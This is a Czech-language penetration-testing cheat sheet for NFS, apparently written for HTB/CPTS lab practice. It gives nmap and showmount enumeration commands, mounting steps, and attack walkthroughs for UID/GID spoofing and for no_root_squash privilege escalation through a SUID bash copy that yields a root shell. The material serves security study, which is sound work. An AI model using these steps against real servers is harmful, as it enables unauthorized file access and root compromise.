# NFS (Network File System) – Porty 111, 2049

NFS slouží ke **sdílení souborů přes síť**.

Používá **RPC (Remote Procedure Call)**.

```
Client
 |
 | Port 111
 ↓
RPCBind
 |
 | "Kde běží NFS?"
 ↓
Port 2049
 |
 ↓
NFS Share
```

---

# Porty

|Port|Účel|
|---|---|
|111 TCP/UDP|RPCBind – hledání služeb|
|2049 TCP/UDP|NFS server|

---

# Verze NFS

|Verze|Bezpečnost|
|---|---|
|NFSv2/v3|Důvěra v UID/GID klienta|
|NFSv4|Podpora Kerberos|

Starší NFS často věří identitě klienta:

```
UID 1000 = uživatel
```

---

# Enumerace

Cíl:

- zjistit exporty
- najít citlivé soubory
- zkontrolovat konfiguraci

---

# Nmap Scan

```
nmap -p111,2049 \
-sV -sC \
TARGET
```

---

# Výpis sdílení

```
showmount -e TARGET
```

Výsledek:

```
/export/home
/var/share
```

---

# NFS Nmap Skripty

```
nmap \
--script nfs-ls,nfs-showmount,nfs-statfs \
-p111,2049 \
TARGET
```

Hledat:

- id_rsa
- config soubory
- flagy
- zálohy

---

# Montování NFS Share

Vytvoření složky:

```
mkdir target_nfs
```

Připojení:

```
sudo mount -t nfs \
TARGET:/share \
./target_nfs \
-o nolock
```

Obsah:

```
ls -la target_nfs
```

---

# Kontrola UID/GID

NFS pracuje podle čísel uživatelů.

```
ls -ln target_nfs
```

Příklad:

```
-rw-r--r-- 1001 1001 flag.txt
```

---

# Útoky

---

# 1. UID/GID Spoofing

NFS v2/v3 věří UID klienta.

Pokud soubor patří:

```
UID 1001
```

vytvoříš stejného uživatele:

```
sudo useradd -u 1001 user1
```

Přepnutí:

```
su user1
```

Přístup:

```
cat flag.txt
```

---

# 2. no_root_squash (Privilege Escalation)

Nejčastější HTB scénář.

Normálně:

```
root klient
 ↓
omezený uživatel serveru
```

S:

```
no_root_squash
```

:

```
root klient
 ↓
root server
```

---

## Útok

Nahraj bash:

```
cp /bin/bash target_nfs/
```

Nastav SUID:

```
chmod +s bash
```

Na serveru:

```
./bash -p
```

Výsledek:

```
root shell
```

---

# 3. Insecure Option

Normálně NFS očekává:

- privilegovaný port (<1024)

Pokud je:

```
insecure
```

může klient použít libovolný port.

---

# NFS Pentest Checklist

☐ Port 111 RPCBind  
☐ Port 2049 NFS  
☐ Exporty přes showmount  
☐ Přístupná data  
☐ UID/GID vlastníci  
☐ no_root_squash  
☐ insecure konfigurace  
☐ SSH klíče a zálohy

---

# CPTS / HTB Workflow

```
Nmap
 ↓
Port 111/2049
 ↓
showmount -e
 ↓
Mount Share
 ↓
Search Files
 ↓
Check UID/GID
 ↓
Exploit no_root_squash
 ↓
Privilege Escalation
```

---

# Rychlý příkazový tahák

|Úkol|Příkaz|
|---|---|
|Najít exporty|`showmount -e IP`|
|Mount|`mount -t nfs IP:/share ./folder -o nolock`|
|Odpojit|`umount folder`|
|UID souboru|`ls -ln file`|
|Vytvořit UID|`useradd -u UID user`|